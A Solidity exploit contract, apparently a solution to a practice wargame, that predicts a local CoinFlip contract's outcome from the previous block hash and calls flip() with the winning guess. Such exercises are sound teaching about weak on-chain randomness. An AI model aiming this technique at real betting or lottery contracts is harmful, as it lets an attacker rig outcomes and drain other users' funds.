// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipExploit {
    using SafeMath for uint256;

    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContractAddress) public {
        coinFlip = CoinFlip(_coinFlipContractAddress);
    }

    function coinFlipAttack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlipResult = blockValue.div(FACTOR);
        bool side = coinFlipResult == 1 ? true : false;
        coinFlip.flip(side);
    }
}
